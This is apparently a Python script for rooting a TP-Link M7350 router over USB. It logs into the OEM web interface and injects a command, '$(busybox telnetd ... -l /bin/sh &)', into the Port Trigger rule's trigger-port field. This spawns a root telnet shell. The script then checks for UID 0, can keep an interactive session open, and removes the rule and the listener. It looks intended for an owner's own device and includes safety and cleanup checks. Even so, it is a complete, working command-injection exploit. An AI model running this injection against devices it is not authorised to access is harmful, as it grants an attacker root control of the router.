#!/usr/bin/env python3
"""Verify a temporary root shell over USB on the reference M7350 OEM firmware."""

import argparse
import errno
import getpass
import hashlib
import http.client
import json
from pathlib import Path
import re
import secrets
import socket
import subprocess
import sys
import time


ROUTER = '192.168.0.1'
STOCK_WEB_SHA256 = '3632d8302159b5913c4cbd01c3a6a626905c1fe7daff3cd0f6cc14f7a832d374'
RULE = 'm7350-usb-shell'
DAEMON = 'busybox telnetd -b 192.168.0.1 -l /bin/sh'


def require(condition, message):
    if not condition:
        raise RuntimeError(message)


def socket_closed(source, port):
    with socket.socket() as sock:
        sock.settimeout(3)
        sock.bind((source, 0))
        return sock.connect_ex((ROUTER, port)) == errno.ECONNREFUSED


def request_http(source, path, body=None):
    connection = http.client.HTTPConnection(ROUTER, timeout=8, source_address=(source, 0))
    try:
        connection.request('GET' if body is None else 'POST', path, body,
                           {'Content-Type': 'application/x-www-form-urlencoded'})
        reply = connection.getresponse()
        require(reply.status == 200, f'Unexpected HTTP status {reply.status}')
        return reply.read()
    finally:
        connection.close()


def cgi(source, module, action, **data):
    endpoint = 'auth_cgi' if module == 'authenticator' else 'web_cgi'
    body = json.dumps(dict(module=module, action=action, **data))
    reply = json.loads(request_http(source, '/cgi-bin/' + endpoint, body))
    if module == 'authenticator' and action == 0:
        require(reply.get('nonce'), 'OEM authentication challenge did not provide a nonce')
        return reply
    require(reply.get('result') == 0, f'OEM {module} action {action} failed')
    return reply


def console(source):
    deadline = time.monotonic() + 8
    while True:
        try:
            return socket.create_connection((ROUTER, 23), timeout=3, source_address=(source, 0))
        except ConnectionRefusedError:
            if time.monotonic() >= deadline:
                raise
            time.sleep(0.25)


def command(sock, line):
    marker = secrets.token_hex(8)
    sock.sendall(f"{line}; printf '\\n{marker}:%s\\n' \"$?\"\r\n".encode())
    output = bytearray()
    negotiation = bytearray()
    deadline = time.monotonic() + 8
    while time.monotonic() < deadline:
        sock.settimeout(max(0.1, deadline - time.monotonic()))
        chunk = sock.recv(4096)
        require(chunk, 'Shell closed before the command completed')
        for byte in chunk:
            if negotiation or byte == 255:
                negotiation.append(byte)
                if len(negotiation) == 2 and byte not in (251, 252, 253, 254):
                    negotiation.clear()
                elif len(negotiation) == 3:
                    reply = 254 if negotiation[1] in (251, 252) else 252
                    sock.sendall(bytes((255, reply, byte)))
                    negotiation.clear()
            else:
                output.append(byte)
        match = re.search(rb'\r?\n' + marker.encode() + rb':(\d+)\r?\n', output)
        if match:
            require(match[1] == b'0', 'Administrative shell command failed')
            return output[:match.start()].decode('ascii', errors='replace')
    raise RuntimeError('Administrative shell response timed out')


def stop_console(source, control):
    with control:
        command(control, 'stty -echo')
        output = command(control, "netstat -lntp | grep '192.168.0.1:23 '")
        listeners = re.findall(r'\bLISTEN\s+([0-9]+)/busybox\b', output)
        require(len(listeners) == 1, 'The temporary Telnet listener PID was not identified')
        pid, = listeners
        command(control, f'''test "$(tr '\\000' ' ' < /proc/{pid}/cmdline)" = "{DAEMON} "''')
        control.sendall(f'kill -TERM {pid}\r\n'.encode())
        deadline = time.monotonic() + 4
        while time.monotonic() < deadline:
            if socket_closed(source, 23):
                return
            time.sleep(0.2)
        raise RuntimeError('The temporary Telnet listener did not stop')


def check_access(source, password, interactive):
    def auth(module, action, **values):
        return cgi(source, module, action, token=token, **values)

    nonce = cgi(source, 'authenticator', 0)['nonce']
    digest = hashlib.md5(f'{password}:{nonce}'.encode()).hexdigest()
    token = cgi(source, 'authenticator', 1, digest=digest)['token']
    try:
        status = auth('status', 0)
        require(status.get('connectedDevices', {}).get('number') == 0,
                'Disconnect all Wi-Fi clients before opening the temporary shell')
        require(auth('portTrigger', 0)['portTriggerList'] == [],
                'Port Trigger list is not empty; existing rules were left alone')
        armed = False
        control = None
        try:
            armed = True
            auth('portTrigger', 1, applicationName=RULE, enableState=1, entryId=1,
                 openPort='2402', openProtocol='TCP',
                 triggerPort=f'$({DAEMON} &)', triggerProtocol='TCP')
            control = console(source)
            result = command(control, 'stty -echo; id -u; cat /proc/sys/kernel/random/boot_id')
            require(re.search(r'(?:^|\n)0\r?(?:\n|$)', result), 'Shell did not report UID 0')
            boot_id = re.search(r'[a-f0-9]{8}(?:-[a-f0-9]{4}){3}-[a-f0-9]{12}', result)
            require(boot_id, 'Missing Linux boot ID')
            print(f'PASS: USB root shell (UID 0), boot ID {boot_id[0]}', flush=True)
            command(control, 'test ! -e /data/m7350-l2 && test ! -e /etc/init.d/m7350-bench')
            if interactive:
                delete_rule(auth)
                subprocess.run(['telnet', '-4', '-b', source, '-c', '-K', ROUTER, '23'],
                               check=True)
        finally:
            if armed:
                try:
                    delete_rule(auth)
                finally:
                    # A successful add can outlive an HTTP error or an interrupted request.
                    if control is None and not socket_closed(source, 23):
                        control = console(source)
                    if control is not None:
                        stop_console(source, control)
                    require(socket_closed(source, 23), 'TCP 23 did not refuse connections after cleanup')
        auth('status', 0)
        print('PASS: OEM status, original empty Port Trigger list, TCP 23 closed')
    finally:
        auth('authenticator', 3)


def delete_rule(auth):
    rules = auth('portTrigger', 0)['portTriggerList']
    if rules:
        require(len(rules) == 1 and rules[0].get('applicationName') == RULE,
                'Temporary rule could not be identified uniquely')
        auth('portTrigger', 2, entryIdSet=[1])
    require(auth('portTrigger', 0)['portTriggerList'] == [], 'Port Trigger cleanup failed')


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('interface', help='Linux USB RNDIS interface')
    parser.add_argument('--password-stdin', action='store_true', help='Read one line from standard input')
    parser.add_argument('--shell', action='store_true', help='Keep an interactive GNU Inetutils telnet session until exit')
    args = parser.parse_args()
    if args.shell and (args.password_stdin or not sys.stdin.isatty()):
        parser.error('--shell requires an interactive terminal and the hidden password prompt')
    route, = json.loads(subprocess.check_output(['ip', '-j', '-4', 'route', 'get', ROUTER]))
    usb_driver = Path('/sys/class/net') / args.interface / 'device/driver'
    require(usb_driver.is_symlink() and usb_driver.resolve().name == 'rndis_host'
            and route.get('dev') == args.interface and not route.get('gateway'),
            'The direct route to 192.168.0.1 must use the specified RNDIS interface')
    source = route['prefsrc']
    require(hashlib.sha256(request_http(source, '/settings.min.js')).hexdigest() == STOCK_WEB_SHA256,
            'OEM web fingerprint does not match the reference firmware')
    for port in (22, 23, 2222):
        require(socket_closed(source, port), f'TCP {port} must refuse connections at baseline')
    print('PASS: direct USB RNDIS route, stock web fingerprint, no existing shell listeners', flush=True)
    require(args.password_stdin or sys.stdin.isatty(), 'A terminal is needed for the hidden password prompt')
    password = sys.stdin.readline().rstrip('\r\n') if args.password_stdin else getpass.getpass('OEM admin password: ')
    require(password, 'OEM admin password is empty')
    check_access(source, password, args.shell)


if __name__ == '__main__':
    try:
        main()
    except RuntimeError as error:
        sys.exit(str(error))
    except (OSError, ValueError, KeyError, subprocess.SubprocessError) as error:
        sys.exit(f'Stopped ({type(error).__name__}). Verify the Port Trigger list and TCP 23 before disconnecting.')
